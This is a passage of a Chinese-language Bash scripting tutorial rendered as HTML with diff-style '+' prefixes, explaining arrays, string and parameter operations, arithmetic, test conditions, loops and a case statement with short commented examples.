+<div class="tabs" id="basharray"><ul class="nav-tabs"><li class="tab active"><a href="#basharray-1">General</a></li><li class="tab"><a href="#basharray-2">More</a></li></ul><div class="tab-content"><div class="tab-pane active" id="basharray-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># array A</span></span><br><span class="line">A[1]=11</span><br><span class="line">A[3]=33</span><br><span class="line">A[4]=`<span class="built_in">expr</span> <span class="variable">$&#123;A[1]&#125;</span> + <span class="variable">$&#123;A[3]&#125;</span>`</span><br><span class="line">A[5]=ee</span><br><span class="line">A[6]=`<span class="built_in">expr</span> <span class="variable">$&#123;A[1]&#125;</span> + <span class="variable">$&#123;A[5]&#125;</span>` <span class="comment"># (FAIL: add integer to string)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[1]&#125;</span>&quot;</span> <span class="comment"># 11</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[3]&#125;</span>&quot;</span> <span class="comment"># 33</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[4]&#125;</span>&quot;</span> <span class="comment"># 44</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[5]&#125;</span>&quot;</span> <span class="comment"># ee</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[6]&#125;</span>&quot;</span> <span class="comment"># (null variable)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;A[11]&#125;</span>&quot;</span> <span class="comment"># (null variable)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array B</span></span><br><span class="line">B=( zero one two three four )</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[0]&#125;</span>  <span class="comment"># zero (zero-based indexing)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[1]&#125;</span>  <span class="comment"># one</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[*]&#125;</span> <span class="comment"># 5 (number of elements)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[@]&#125;</span> <span class="comment"># 5 (number of elements)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[0]&#125;</span> <span class="comment"># 4 (length of first element)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#B[1]&#125;</span> <span class="comment"># 3 (length of second element)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;B[@]:1:2&#125;</span> <span class="comment"># one two (substring extraction)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array C</span></span><br><span class="line">C=([7]=seven [8]=eight)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;C[7]&#125;</span>&quot;</span> <span class="comment"># seven</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;C[8]&#125;</span>&quot;</span> <span class="comment"># eight</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array base64_charset</span></span><br><span class="line">base64_charset=( &#123;A..Z&#125; &#123;a..z&#125; &#123;0..9&#125; + / = )</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="basharray-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># concat</span></span><br><span class="line">A=(a b)</span><br><span class="line">B=(c d)</span><br><span class="line">C=(<span class="variable">$&#123;A[@]&#125;</span> <span class="variable">$&#123;B[@]&#125;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;C[@]&#125;</span> <span class="comment"># a b c d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># traversal</span></span><br><span class="line">A=(1 2 3 4 5)</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;A[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$e</span> <span class="comment"># 1  2  3  4  5</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>$&#123; #A&#125;</code> <br> <code>expr length $A</code></td>
+<td align="left">返回字符串长度，等同<code>c/strlen()</code> <br> 对于位置参数变量语法：<code>$&#123; #*&#125;</code>或<code>$&#123; #@&#125;</code> <br> 对于数组中元素数量语法：<code>$&#123; #array[*]&#125;</code>或<code>$&#123; #array[@]&#125;</code></td>
+</tr>
+<tr>
+<td align="left"><code>expr match &quot;$A&quot; &#39;$b&#39;</code></td>
+<td align="left">返回从字符串A开头匹配子字符串b的长度</td>
+</tr>
+<tr>
+<td align="left"><code>expr index $A $b</code></td>
+<td align="left">返回在字符串A中首次包含子字符串b的索引，等同<code>c/strchr()</code></td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A:1:3&#125;</code> <br> <code>expr substr $A $1 $3</code></td>
+<td align="left">返回子字符串（从position&#x3D;1开始的length&#x3D;3个字符）<br> 对于位置参数变量语法：<code>$&#123;*:2&#125;</code>或<code>$&#123;@:2&#125;</code></td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A#b&#125;</code></td>
+<td align="left">从A的首部删除最短匹配b的部分</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A##b&#125;</code></td>
+<td align="left">从A的首部删除最长匹配b的部分</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A%b&#125;</code></td>
+<td align="left">从A的尾部删除最短匹配b的部分</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A%%b&#125;</code></td>
+<td align="left">从A的尾部删除最长匹配b的部分</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A/b/c&#125;</code></td>
+<td align="left">替换A中第一个匹配b的部分为c</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A//b/c&#125;</code></td>
+<td align="left">替换A中所有匹配b的部分为c</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A/#b/c&#125;</code></td>
+<td align="left">替换A中首部匹配b的部分为c</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A/%b/c&#125;</code></td>
+<td align="left">替换A中尾部匹配b的部分为c</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">S=a/b/c</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#S&#125;</span>       <span class="comment"># 5   (get length)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S:1:3&#125;</span>    <span class="comment"># /b/ (get substring)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S: -3:2&#125;</span>  <span class="comment"># b/  (get substring, 负数前需加空格)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S:(-3):2&#125;</span> <span class="comment"># b/  (get substring, 负数需加小括号)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S#a*/&#125;</span>    <span class="comment"># b/c (del substring, 从首部最短匹配，等同$&#123;S#*/&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S##a*/&#125;</span>   <span class="comment"># c   (del substring, 从首部最长匹配，等同$&#123;S##*/&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S%/*c&#125;</span>    <span class="comment"># a/b (del substring, 从尾部最短匹配，等同$&#123;S%/*&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S%%/*c&#125;</span>   <span class="comment"># a   (del substring, 从尾部最长匹配，等同$&#123;S%%/*&#125;)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/b/B&#125;</span>    <span class="comment"># a/B/c (replace substring, 替换从首部的第一个匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/\//-&#125;</span>   <span class="comment"># a-b/c (replace substring, 正斜杠/需用反斜杠\进行转义)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S//\//-&#125;</span>  <span class="comment"># a-b-c (replace substring, 替换所有匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/#a/A&#125;</span>   <span class="comment"># A/b/c (replace substring, 替换时限制从首部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;S/%c/C&#125;</span>   <span class="comment"># a/b/C (replace substring, 替换时限制从尾部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="variable">$S</span> /b/`          <span class="comment"># 2 (get index, 从1开始计算)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> match <span class="variable">$S</span> <span class="string">&#x27;[ab/]*&#x27;</span>`     <span class="comment"># 4 (get length of match, 从首部匹配)</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> match <span class="variable">$S</span> <span class="string">&#x27;\([ab/]*\)&#x27;</span>` <span class="comment"># a/b/ (get substring, 从首部提取)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参数代换"><a href="#参数代换" class="headerlink" title="参数代换"></a>参数代换</h2><p>参数代换（parameter substitution）</p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>$&#123;A-B&#125;, $&#123;A:-B&#125;</code></td>
+<td align="left">A有值 ? 返回A : 返回B</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A=B&#125;, $&#123;A:=B&#125;</code></td>
+<td align="left">A有值 ? 返回A : 将A值设置为B后返回A</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A+B&#125;, $&#123;A:+B&#125;</code></td>
+<td align="left">A有值 ? 返回B : 返回空字符串</td>
+</tr>
+<tr>
+<td align="left"><code>$&#123;A?err_msg&#125;, $&#123;A:?err_msg&#125;</code></td>
+<td align="left">A有值 ? 返回A : 终止脚本并打印err_msg，退出状态<code>$?</code>为1</td>
+</tr>
+</tbody></table>
+<h2 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h2><ul>
+<li>命令代换（command substitution）使用后引号（backquotes，``），用于将命令的输出插入上下文中</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="built_in">pwd</span>` <span class="comment"># /root</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="算术展开"><a href="#算术展开" class="headerlink" title="算术展开"></a>算术展开</h2><p><a target="_blank" rel="noopener" href="https://tldp.org/LDP/abs/html/arithexp.html">Advanced Bash-Scripting Guide: Arithmetic Expansion</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=1</span><br><span class="line">b=`<span class="built_in">expr</span> <span class="variable">$a</span> + 2`</span><br><span class="line">c=$((<span class="variable">$b</span>+<span class="number">3</span>))</span><br><span class="line">d=$((<span class="variable">$c</span>+<span class="number">4</span>))</span><br><span class="line">((e = d + <span class="number">5</span>))</span><br><span class="line"><span class="built_in">let</span> f=e+6</span><br><span class="line"><span class="built_in">let</span> <span class="string">&quot;g = f + 7&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> <span class="variable">$b</span> <span class="variable">$c</span> <span class="variable">$d</span> <span class="variable">$e</span> <span class="variable">$f</span> <span class="variable">$g</span> <span class="comment"># 1 3 6 10 15 21 28</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a>间接引用</h2><ul>
+<li><code>eval var=\$$var</code>语法可以获取到var变量的值（又被作为变量解析）的值</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=b</span><br><span class="line">b=12</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> \$<span class="variable">$a</span> <span class="comment"># b $b</span></span><br><span class="line"><span class="built_in">eval</span> a=\$<span class="variable">$a</span>  <span class="comment"># (Indirect reference)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span> \$<span class="variable">$a</span> <span class="comment"># 12 $12</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="测试条件"><a href="#测试条件" class="headerlink" title="测试条件"></a>测试条件</h1><h2 id="数值比较"><a href="#数值比较" class="headerlink" title="数值比较"></a>数值比较</h2><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>[ &quot;$a&quot; -eq &quot;$b&quot; ]</code></td>
+<td align="left">a等于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; -ne &quot;$b&quot; ]</code></td>
+<td align="left">a不等于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; -gt &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &gt; &quot;$b&quot;))</code></td>
+<td align="left">a大于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; -ge &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &gt;= &quot;$b&quot;))</code></td>
+<td align="left">a大于或等于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; -lt &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &lt; &quot;$b&quot;))</code></td>
+<td align="left">a小于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; -le &quot;$b&quot; ]</code><br><code>((&quot;$a&quot; &lt;= &quot;$b&quot;))</code></td>
+<td align="left">a小于或等于b?</td>
+</tr>
+</tbody></table>
+<h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>[ &quot;$a&quot; = &quot;$b&quot; ]</code><br><code>[ &quot;$a&quot; == &quot;$b&quot; ]</code></td>
+<td align="left">a等于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$a&quot; != &quot;$b&quot; ]</code></td>
+<td align="left">a不等于b?</td>
+</tr>
+<tr>
+<td align="left"><code>[[ &quot;$a&quot; &lt; &quot;$b&quot; ]]</code></td>
+<td align="left">a小于b（ASCII alphabetical order）?</td>
+</tr>
+<tr>
+<td align="left"><code>[[ &quot;$a&quot; &gt; &quot;$b&quot; ]]</code></td>
+<td align="left">a大于b（ASCII alphabetical order）?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -z &quot;$a&quot; ]</code></td>
+<td align="left">a为空字符串?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -n &quot;$a&quot; ]</code></td>
+<td align="left">a为非空字符串?</td>
+</tr>
+</tbody></table>
+<h2 id="逻辑比较"><a href="#逻辑比较" class="headerlink" title="逻辑比较"></a>逻辑比较</h2><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>[ &quot;$expr1&quot; -a &quot;$expr2&quot; ]</code><br><code>[[ condition1 &amp;&amp; condition2 ]]</code></td>
+<td align="left">logical and</td>
+</tr>
+<tr>
+<td align="left"><code>[ &quot;$expr1&quot; -o &quot;$expr2&quot; ]</code><br><code>[[ condition1 || condition2 ]]</code></td>
+<td align="left">logical or</td>
+</tr>
+</tbody></table>
+<h2 id="文件测试"><a href="#文件测试" class="headerlink" title="文件测试"></a>文件测试</h2><table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>[ -e /a/b ]</code><br><code>[ -a /a/b ]</code></td>
+<td align="left">文件存在?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -f /a/b ]</code></td>
+<td align="left">常规文件（非目录或设备）?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -s /a/b ]</code></td>
+<td align="left">文件大小不等于0?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -d /a/b ]</code></td>
+<td align="left">目录文件?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -b /a/b ]</code></td>
+<td align="left">块（block）设备?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -c /dev/sda ]</code></td>
+<td align="left">字符（character）设备?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -p /dev/fd/0 ]</code></td>
+<td align="left">pipe file?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -h /a/b ]</code><br><code>[ -L /a/b ]</code></td>
+<td align="left">symbolic link?</td>
+</tr>
+<tr>
+<td align="left"><code>[ -S /a/b ]</code></td>
+<td align="left">socket file?</td>
+</tr>
+</tbody></table>
+<h1 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h1><h2 id="循环体"><a href="#循环体" class="headerlink" title="循环体"></a>循环体</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><div class="tabs" id="bashfor"><ul class="nav-tabs"><li class="tab active"><a href="#bashfor-1">General</a></li><li class="tab"><a href="#bashfor-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashfor-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..100&#125;; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashfor-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">for</span> ((a=<span class="number">1</span>, b=<span class="number">1</span>; a &lt;= LIMIT ; a++, b++)); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span>-<span class="variable">$b</span> &quot;</span> <span class="comment"># 1-1 2-2 3-3 </span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><div class="tabs" id="bashwhile"><ul class="nav-tabs"><li class="tab active"><a href="#bashwhile-1">General</a></li><li class="tab"><a href="#bashwhile-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashwhile-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=0</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$a</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$LIMIT</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  a=`<span class="built_in">expr</span> <span class="variable">$a</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashwhile-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">((a = <span class="number">0</span>))</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">while</span> (( a &lt; LIMIT )); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  ((a += <span class="number">1</span>))    <span class="comment"># let &quot;a+=1&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><div class="tabs" id="bashuntil"><ul class="nav-tabs"><li class="tab active"><a href="#bashuntil-1">General</a></li><li class="tab"><a href="#bashuntil-2">C-Style</a></li></ul><div class="tab-content"><div class="tab-pane active" id="bashuntil-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=0</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">until</span> [ <span class="string">&quot;<span class="variable">$a</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$LIMIT</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  <span class="built_in">let</span> <span class="string">&quot;a+=1&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="bashuntil-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">((a = <span class="number">0</span>))</span><br><span class="line">LIMIT=3</span><br><span class="line"><span class="keyword">until</span> (( a &gt;= LIMIT )); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$a</span> &quot;</span> <span class="comment"># 0 1 2 </span></span><br><span class="line">  ((a += <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><ul>
+<li><code>break [N]</code>支持跳出多层循环，默认N&#x3D;1</li>
+</ul>
+<div class="tabs" id="loopbreak"><ul class="nav-tabs"><li class="tab active"><a href="#loopbreak-1">TermInnermostLoop</a></li><li class="tab"><a href="#loopbreak-2">OutOfNLevelsOfLoop</a></li></ul><div class="tab-content"><div class="tab-pane active" id="loopbreak-1"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">break</span> <span class="comment"># [1] 1 2 </span></span><br><span class="line">            <span class="comment"># [2] 1 2 </span></span><br><span class="line">            <span class="comment"># [3] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="loopbreak-2"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">break</span> 2 <span class="comment"># [1] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></div></div>
+
+<h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><ul>
+<li><code>continue [N]</code>支持跳到外部循环执行点继续执行，默认N&#x3D;1</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> outer <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;[<span class="variable">$outer</span>] &quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> inner <span class="keyword">in</span> 1 2 3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$inner</span> &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$inner</span>&quot;</span> -eq 2 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">continue</span> 2 <span class="comment"># [1] 1 2 [2] 1 2 [3] 1 2 </span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h2><h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><ul>
+<li>case结构类似于c语言中的switch</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> Keypress</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$Keypress</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  [[:lower:]] ) <span class="built_in">echo</span> <span class="string">&quot;Lowercase letter&quot;</span>;;</span><br><span class="line">  [[:upper:]] ) <span class="built_in">echo</span> <span class="string">&quot;Uppercase letter&quot;</span>;;</span><br><span class="line">  [0-9]       ) <span class="built_in">echo</span> <span class="string">&quot;Digit&quot;</span>;;</span><br><span class="line">  *           ) <span class="built_in">echo</span> <span class="string">&quot;Punctuation, whitespace, or other&quot;</span>;;</span><br><span 